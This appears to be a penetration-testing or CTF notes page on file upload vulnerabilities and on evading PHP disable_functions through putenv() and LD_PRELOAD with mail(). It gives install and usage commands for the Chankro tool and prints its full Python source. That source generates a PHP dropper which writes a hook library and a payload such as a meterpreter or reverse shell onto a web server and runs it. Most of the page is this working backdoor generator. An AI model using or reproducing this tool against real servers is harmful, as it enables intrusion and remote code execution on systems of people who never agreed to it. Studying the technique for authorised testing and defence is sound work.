## Description
```Description
What is a file upload vulnerability?
This vulnerability occurs in web applications where there is the possibility of uploading a file without being checked by a security system that curbs potential dangers.
```

```INFO
Among the typically applied measures is disabling dangerous functions that could execute operating system commands or start processes. Functions such as system() or shell_exec() are often disabled through PHP directives defined in the php.ini configuration file. Other functions, perhaps less known as dl() (which allows you to load a PHP extension dynamically), can go unnoticed by the system administrator and not be disabled. The usual thing in an intrusion test is to list which functions are enabled in case any have been forgotten.
One of the easiest techniques to implement and not very widespread is to abuse the mail() and putenv() functionalities. This technique is not new, it was already reported to [PHP in 2008](https://bugs.php.net/bug.php?id=46741) by gat3way, but it still works to this day. Through the putenv() function, we can modify the environment variables, allowing us to assign the value we want to the variable LD_PRELOAD. Roughly LD_PRELOAD will allow us to pre-load a .so library before the rest of the libraries, so that if a program uses a function of a library (libc.so for example), it will execute the one in our library instead of the one it should. In this way, we can hijack or "hook" functions, modifying their behaviour at will.
```

```Exploitation
[Chankro](https://github.com/TarlogicSecurity/Chankro): tool to evade disable_functions and open_basedir
Through Chankro, we generate a PHP script that will act as a dropper, creating on the server a .so library and the binary (a meterpreter, for example) or bash script (reverse shell, for example) that we want to execute freely, and that will later call putenv() and mail() to launch the process.

```

```Github_Repo
Install tool:
git clone https://github.com/TarlogicSecurity/Chankro.git
cd Chankro
python2 chankro.py --help
`python chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html`
```

## Source Code 
firstly python script 
```python cat chankro.py 
######## Chankro v0.4 #######

# [+] Bypass disable_functions
# [+] Bypass open_basedir

##############################
#          @TheXC3LL         #
##############################


import argparse
import base64
import os

parser = argparse.ArgumentParser(description='Generate PHP backdoor')
parser.add_argument('--arch', dest='arch',help='Architecture (32 or 64)')
parser.add_argument('--input', dest='meter', help='Binary to be executed (p.e. meterpreter)')
parser.add_argument('--output', dest='out', help='PHP filename')
parser.add_argument('--path', dest='pati', help='Absolute path')
args = parser.parse_args()

# path where the tool is installed
script_path = os.path.dirname(os.path.realpath(__file__))

print "\n\n     -=[ Chankro ]=-\n    -={ @TheXC3LL }=-\n\n"


if not args.meter:
	print "[!] Error: please select a valid file as input"
 	exit()
try:
	with open(args.meter, "rb") as file:
		encoded_shell = base64.b64encode(file.read())
except:
	print "[!] Error: file could not be opened"
	exit()
if not args.out:
	print "[!] Error: please select a valid file as output"
	exit()
try:
        if (os.path.isabs(args.out)):
                outfile = open(args.out, "w") # absolute path provided
        else:
                outfile = open(os.getcwd() + '/' + args.out, "w") # relative path provided
except:
	print "[!] Error: file could not be created"
	exit()

if not args.arch:
	print "[!] Error: select architecture (64 or 32)"
	exit()
else:
	if args.arch != "32" and args.arch != "64":
		print "[!] Error: unknow architecture"
		exit()
	else:
		archi = script_path + "/hook" + args.arch + ".so"
if not args.pati:
	print "[!] Error: remote path"
	exit()

with open(archi, "rb") as bicho:
	encoded_bicho = base64.b64encode(bicho.read())


head = "<?php\n $hook = '" + encoded_bicho  + "';\n"
body1 = "$meterpreter = '" + encoded_shell + "';\n"
body2 = "file_put_contents('" + args.pati + "/chankro.so', base64_decode($hook));\n"
body3 = "file_put_contents('" + args.pati + "/acpid.socket', base64_decode($meterpreter));\n"
cosa3 = "putenv('CHANKRO=" + args.pati + "/acpid.socket');\n"
tail1 = "putenv('LD_PRELOAD=" + args.pati + "/chankro.so');\n"
tail2 = "mail('a','a','a','a');?>"

print "[+] Binary file: " + args.meter
print "[+] Architecture: x" + args.arch
print "[+] Final PHP: " + args.out + "\n\n"


outfile.write(head + body1 + body2 + body3 + cosa3 + tail1 + tail2)
outfile.close()
print "[+] File created!"

```

